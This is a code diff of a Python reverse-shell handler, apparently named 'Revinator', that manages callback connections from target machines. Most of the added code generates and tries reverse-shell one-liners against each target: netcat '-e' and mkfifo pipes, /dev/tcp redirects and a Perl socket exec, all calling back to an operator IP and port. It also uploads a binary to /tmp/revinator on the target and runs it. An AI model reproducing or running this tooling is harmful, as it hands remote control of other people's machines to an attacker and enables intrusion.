@@ -35,9 +35,10 @@ class connection:
         self.cmd = False
         self.first = first
         self.echo_command = None
-        self.conn.settimeout(0.1)
+        self.conn.settimeout(0.2)
+        if not self.echo_cmd_test():
+            print("ERROR IN ECHO TEST")
         if self.first:
-            self.echo_cmd_test()
             threading.Thread(target=self.set_rev).start()
 
 
@@ -47,13 +48,13 @@ class connection:
         while self.cmd:
             try:
                 data = self.conn.recv(1024).decode()
+                if data:
+                    self.recorded += data
             except TimeoutError:
                 break
-            if data:
-                self.recorded += data
             
     def echo_cmd_test(self):
-        cmd = "echo HI_REVINATOR\r"
+        cmd = "echo HI_REVINATOR\n"
         self.conn.send(cmd.encode())
 
         #threading.Thread(target=self.rcv_stream).start()
@@ -61,18 +62,23 @@ class connection:
 
         #time.sleep(0.1)
         self.cmd = False
+        print("ECHO TEST:",self.recorded)
 
         self.echo_command = self.recorded.count("echo HI_REVINATOR")
+        if "HI_REVINATOR" not in self.recorded:
+            print("HI_REVINATOR is NOT in: ", self.recorded)
+            return False
+        return True
 
     def send_rcv(self, cmd):
 
-        cmd += "; echo REVINATOR_COMPLETE\r"
+        cmd += "; echo REVINATOR_COMPLETE\r\n\r\n"
         self.conn.send(cmd.encode())
 
         #threading.Thread(target=self.rcv_stream).start()
         self.rcv_stream()
-        #while self.recorded.count("REVINATOR_COMPLETE") < self.echo_command + 1:
-        #    time.sleep(0.1)
+        while self.recorded.count("REVINATOR_COMPLETE") < self.echo_command + 1:
+            time.sleep(0.1)
 
         self.cmd = False
         return self.recorded
@@ -80,14 +86,30 @@ class connection:
 
     def test_revs(self):
         global num_cons
-        for rev in self.rev:
-            num = num_cons
-            self.conn.send(rev.encode())
-            time.sleep(0.2)
-            if num_cons > num:
-                self.working_rev = rev
-                return
+        inc = ["","&"]
+        for i in inc:
+            for rev in self.rev:
+                rev += f" {i} \r\n\r\n"
+                print("TESTING REV: ", rev)
+                num = num_cons
+                self.conn.send(rev.encode())
+                time.sleep(0.5)
+                if num_cons > num:
+                    self.working_rev = rev
+                    return
             
+
+    def send(self, st):
+        st = st + "\n"
+        self.conn.send(st.encode())
+
+    def recv(self):
+        r = ""
+        try:
+            r = self.conn.recv(1024).decode()
+        except:
+            pass
+        return r
 
 
 
@@ -97,34 +119,71 @@ class connection:
 
         bins = self.recorded.split("\n")
         shells = ["dash","bash","sh","bsh","csh","ksh","zsh","pdksh","tcsh","mksh"]
-        
+        known_shells = []
+        progs = {}
+
+        for bin in bins:
+            progs[bin.split("/")[-1]] = bin
+
+        if "script" in progs:
+            print("SENDING LOLZ")
+            self.send("cat > /tmp/revinator; chmod +x /tmp/revinator; /tmp/revinator")#
+            FILE = "rev5555"
+            with open(FILE,"rb") as f:
+                r = f.read()
+            self.conn.sendall(r)
+            self.conn.sendall("\x04".encode())
+            self.conn.close()
+            #self.send(f"\x04")
+            #self.send("chmod +x /tmp/revinator")
+            #self.send("/tmp/revinator")
+            self.rev.append("/tmp/revinator &")
+            return
 
 
-        if "/usr/bin/nc" in bins:
-            self.rev.append(f"nc {IP} {PORT} -e /usr/bin/bash & \r")
-            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f")
-            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1| /usr/bin/nc {IP} {PORT} >/tmp/f")
-            self.rev.append(f"/usr/bin/nc {IP} {PORT} -e /usr/bin/bash & \r")
+        if "perl" in progs:
+            for sh in shells:
+                if sh in progs:
+                    c = """perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("SH -i");};'""".replace("IP", IP).replace("PORT", str(PORT)).replace("SH", sh)
+                    self.rev.append(c)
 
-        if "/bin/nc" in bins:
-            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f")
-            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
-            self.rev.append(f"nc {IP} {PORT} -e /usr/bin/bash & \r")
-            self.rev.append(f"/bin/nc {IP} {PORT} -e /usr/bin/bash & \r")
 
         for shell in shells:
             sh = f"/bin/{shell}"
             if sh in bins:
-                self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196 & \r")
-                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 \r")
+                known_shells.append(sh)
+
             sh = f"/usr/bin/{shell}"
             if sh in bins:
-                self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196 & \r")
-                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 \r")
+                known_shells.append(sh)
+
+
+        if "/usr/bin/nc" in bins:
+            for sh in known_shells:
+                self.rev.append(f"nc {IP} {PORT} -e {sh} ")
+                self.rev.append(f"nc -c {sh} {IP} {PORT} ")
+                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1|nc {IP} {PORT} >/tmp/f ")
+                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| {sh} -i 2>&1| /usr/bin/nc {IP} {PORT} >/tmp/f ")
+                self.rev.append(f"/usr/bin/nc {IP} {PORT} -e {sh} ")
+                self.rev.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
+
+        if "/bin/nc" in bins:
+            for sh in known_shells:
+                self.rev.append(f"nc {IP} {PORT} -e {sh}")
+                self.rev.append(f"nc -c {sh} {IP} {PORT}")
+                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {IP} {PORT} >/tmp/f")
+                self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
+                self.rev.append(f"/bin/nc {IP} {PORT} -e {sh} ")
+                self.rev.append(f"/usr/bin/nc -c {sh} {IP} {PORT} ")
+
+        for sh in known_shells:
+            self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196")
+            self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 
         self.test_revs()
         global unique_addresses
+        print("REV = "+ self.working_rev)
         print(f"{len(unique_addresses) - 1}:\t{self.addr}")
         #new_rev[self.addr] = self.rev
         self.record = False
@@ -234,6 +293,7 @@ def run(quiet_mode=False):
                 waitingl.append([ip, connections[-1]])
 
             else:                                       # connection from target machine
+                print("CONNECTION")
                 num_cons += 1
                 #pdb.set_trace()
                 if IP == "":
